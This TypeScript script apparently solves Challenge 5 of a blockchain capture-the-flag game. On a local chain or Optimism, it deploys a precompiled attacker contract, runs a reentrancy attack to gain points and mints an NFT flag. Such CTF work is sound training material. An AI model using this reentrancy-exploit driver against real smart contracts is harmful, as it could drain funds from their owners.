import {
  createPublicClient,
  createWalletClient,
  getContract,
  http,
  encodeAbiParameters,
} from "viem";
import { privateKeyToAccount } from "viem/accounts";
import * as chains from "viem/chains";
import * as dotenv from "dotenv";
import * as fs from "fs";
import * as path from "path";
import { fileURLToPath } from "url";
import { contractsData } from "../contracts/types";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

dotenv.config();

// ========================
// Configuration
// ========================
// Check --local flag from command line arguments
const isLocal = process.argv.includes("--local");

// Chain selection
const TARGET_CHAIN = isLocal ? chains.hardhat : chains.optimism;

// Private key of account #0 on local chain
const LOCAL_CHAIN_1ST_ACCOUNT_PK =
  "0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80" as const;

// Select private key (differentiate between local and production)
const MY_WALLET_PK = isLocal
  ? LOCAL_CHAIN_1ST_ACCOUNT_PK  // Use Hardhat private key for local
  : (process.env.__RUNTIME_DEPLOYER_PRIVATE_KEY as `0x${string}`) || (() => {
      console.error("❌ __RUNTIME_DEPLOYER_PRIVATE_KEY configuration is required for Optimism network");
      console.error("   Please set private key in packages/scripts/.env file");
      process.exit(1);
      return "" as `0x${string}`;
    })();

const myWalletAccount = privateKeyToAccount(MY_WALLET_PK);

// Clients
const walletClient = createWalletClient({
  account: myWalletAccount,
  chain: TARGET_CHAIN,
  transport: http(),
});

const publicClient = createPublicClient({
  chain: TARGET_CHAIN,
  transport: http(),
});

// Challenge5 contract instance
const challenge5Contract = getContract({
  // @ts-ignore Defined after deployment
  address: contractsData[TARGET_CHAIN.id].Challenge5.address,
  // @ts-ignore Defined after deployment
  abi: contractsData[TARGET_CHAIN.id].Challenge5.abi,
  client: { public: publicClient, wallet: walletClient },
});

// Load attacker contract artifact
const attackerArtifactPath = path.join(
  __dirname,
  "../../hardhat/artifacts/contracts/Challenge5Attacker.sol/Challenge5Attacker.json"
);

let ATTACKER_ABI: any;
let ATTACKER_BYTECODE: `0x${string}`;

try {
  const attackerArtifact = JSON.parse(fs.readFileSync(attackerArtifactPath, "utf8"));
  ATTACKER_ABI = attackerArtifact.abi;
  ATTACKER_BYTECODE = attackerArtifact.bytecode as `0x${string}`;
} catch (error) {
  console.error("❌ Challenge5Attacker artifact not found");
  console.error("   Please compile with hardhat: yarn compile");
  process.exit(1);
}

async function solveChallenge5() {
  const chainName = isLocal ? "Local" : "Optimism";
  console.log(`🚀 Starting to solve Challenge 5 on ${chainName}...`);
  console.log("");
  console.log("📚 Challenge 5 Mechanism:");
  console.log("   - Need to obtain 10 points");
  console.log("   - Will try multiple methods");
  console.log("");

  console.log("📍 Solver address:", myWalletAccount.address);
  console.log("📍 Challenge5 address:", challenge5Contract.address);

  try {
    // Check if already has NFT (for early exit)
    try {
      const currentPoints = await challenge5Contract.read.points([
        myWalletAccount.address
      ]);

      if (currentPoints >= 10n) {
        // If already has 10+ points, try mintFlag
        try {
          const mintTx = await challenge5Contract.write.mintFlag();
          await publicClient.waitForTransactionReceipt({ hash: mintTx });
          console.log("✅ This address has already obtained Challenge 5 NFT");
          console.log("🎉 Challenge 5 is already complete!");
          return;
        } catch (mintError: any) {
          if (mintError.message?.includes("User address has already minted for this challenge")) {
            console.log("✅ This address has already obtained Challenge 5 NFT");
            console.log("🎉 Challenge 5 is already complete!");
            return;
          }
          // Continue for other errors
        }
      }
    } catch {
      // Ignore point check errors and continue
    }

    // Check current points
    let currentPoints = await challenge5Contract.read.points([
      myWalletAccount.address
    ]);
    console.log("");
    console.log("📊 Current points:", currentPoints.toString());

    // Method 1: Simple repeated execution
    if (currentPoints < 10n) {
      console.log("");
      console.log("🔧 Method 1: Trying simple repeated execution...");

      for (let i = currentPoints + 1n; i <= 10n; i++) {
        console.log(`📝 Point acquisition attempt ${i}/10...`);

        try {
          const claimTx = await challenge5Contract.write.claimPoints();
          const receipt = await publicClient.waitForTransactionReceipt({
            hash: claimTx
          });

          if (receipt.status === "success") {
            currentPoints = await challenge5Contract.read.points([
              myWalletAccount.address
            ]);
            console.log(`   ✅ Success! Current points: ${currentPoints}`);
          }

          if (currentPoints >= 10n) {
            break;
          }
        } catch (e: any) {
          console.log(`   Error: ${e.message}`);
          break;
        }
      }
    }

    // If 10 points not obtained, try reentrancy attack
    if (currentPoints < 10n) {
      console.log("");
      console.log("🔧 Method 2: Trying reentrancy attack...");

      // Reset points (if needed)
      if (currentPoints > 0n) {
        console.log("🔄 Resetting points...");
        const resetTx = await challenge5Contract.write.resetPoints();
        await publicClient.waitForTransactionReceipt({ hash: resetTx });
        console.log("✅ Points reset");

        // Verify complete transaction confirmation (avoid nonce issues)
        console.log("⏳ Verifying transaction confirmation...");

        // Get current transaction count to confirm it's been processed
        const currentNonce = await publicClient.getTransactionCount({
          address: myWalletAccount.address,
          blockTag: 'latest'
        });
        console.log(`   Current nonce: ${currentNonce}`);
      }

      // Deploy attacker contract
      console.log("");
      console.log("🔨 Deploying attacker contract...");

      const constructorArgs = encodeAbiParameters(
        [{ type: "address" }],
        [challenge5Contract.address as `0x${string}`]
      );

      const deploymentBytecode = (ATTACKER_BYTECODE + constructorArgs.slice(2)) as `0x${string}`;

      // Get current nonce and set it explicitly in transaction
      const deployNonce = await publicClient.getTransactionCount({
        address: myWalletAccount.address,
        blockTag: 'pending' // Use pending to get latest nonce
      });

      console.log(`   Deploy nonce: ${deployNonce}`);

      // EIP-1559 style gas settings (Optimism compatible)
      const feeData = await publicClient.estimateFeesPerGas();

      const deployHash = await walletClient.sendTransaction({
        data: deploymentBytecode,
        nonce: deployNonce,
        maxFeePerGas: feeData.maxFeePerGas ? feeData.maxFeePerGas * 11n / 10n : undefined, // 10% increase
        maxPriorityFeePerGas: feeData.maxPriorityFeePerGas ? feeData.maxPriorityFeePerGas * 11n / 10n : undefined,
      });

      console.log("⏳ Deploy transaction:", deployHash);
      const deployReceipt = await publicClient.waitForTransactionReceipt({
        hash: deployHash,
        confirmations: 1, // Wait for 1 block confirmation
      });

      if (!deployReceipt.contractAddress) {
        throw new Error("Failed to deploy attacker contract");
      }

      const attackerAddress = deployReceipt.contractAddress;
      console.log("✅ Attacker contract deployed:", attackerAddress);

      const attackerContract = getContract({
        address: attackerAddress,
        abi: ATTACKER_ABI,
        client: { public: publicClient, wallet: walletClient },
      });

      // Execute reentrancy attack
      console.log("");
      console.log("⚔️  Executing reentrancy attack...");

      try {
        const attackTx = await attackerContract.write.attack([]);
        console.log("⏳ Attack transaction:", attackTx);

        const attackReceipt = await publicClient.waitForTransactionReceipt({
          hash: attackTx
        });

        if (attackReceipt.status === "success") {
          console.log("✅ Reentrancy attack succeeded");

          // Check points via attacker contract
          const attackerPoints = await attackerContract.read.checkPoints([]) as bigint;
          console.log("📊 Points verified from attacker contract:", attackerPoints.toString());

          currentPoints = await challenge5Contract.read.points([
            myWalletAccount.address
          ]);
        }
      } catch (attackError: any) {
        console.log("❌ Reentrancy attack failed:", attackError.message);
        // Check current points even after attack failure
        currentPoints = await challenge5Contract.read.points([
          myWalletAccount.address
        ]);
      }
    }

    // Check final points
    const finalPoints = await challenge5Contract.read.points([
      myWalletAccount.address
    ]);
    console.log("");
    console.log("📊 Final points:", finalPoints.toString());

    // Mint flag
    if (finalPoints >= 10n) {
      console.log("🚩 Minting flag...");
      const mintTx = await challenge5Contract.write.mintFlag();
      const receipt = await publicClient.waitForTransactionReceipt({
        hash: mintTx
      });

      if (receipt.status === "success") {
        console.log("");
        console.log("🎉 Challenge 5 complete!");
        console.log("🚩 NFT Flag #5 has been minted!");
        console.log("");
        console.log("📚 What we learned:");
        console.log("   - Understanding contract point systems");
        console.log("   - Trying multiple solution approaches");
        console.log("   - Difference between tx.origin and msg.sender");
      }
    } else {
      console.log("❌ Insufficient points");
      console.log("💡 Try another method or check contract specifications");
      process.exit(1); // Exit with error code to indicate failure
    }
  } catch (error: any) {
    // Treat as success if already minted
    if (error.message?.includes("User address has already minted for this challenge")) {
      console.log("✅ This address has already obtained Challenge 5 NFT");
      console.log("🎉 Challenge 5 is already complete!");
      return;
    }

    console.error("❌ Error:", error.message || error);

    if (error.message?.includes("User address is not registered")) {
      console.log("");
      console.log("💡 Please complete Challenge 1 first");
    }
    process.exit(1); // Exit with error code on error
  }
}

// Display help
if (process.argv.includes("--help") || process.argv.includes("-h")) {
  console.log("📖 Challenge 5 - Point System Challenge");
  console.log("");
  console.log("Usage:");
  console.log("  npx tsx src/solveChallenge5.ts [options]");
  console.log("");
  console.log("Options:");
  console.log("  --local  Execute on local chain (requires: yarn chain & yarn deploy)");
  console.log("  --help   Display this help");
  console.log("");
  console.log("Description:");
  console.log("  Obtain 10 points and mint flag");
  console.log("  Will try multiple solutions");
  console.log("");
  console.log("Requirements:");
  console.log("  - Challenge 1 completed");
  console.log("  - Optimism: ETH for gas fees");
  console.log("  - Local: yarn chain & yarn deploy executed");
  process.exit(0);
}

// Execute script
solveChallenge5().catch((error) => {
  console.error(error);
  process.exit(1);
});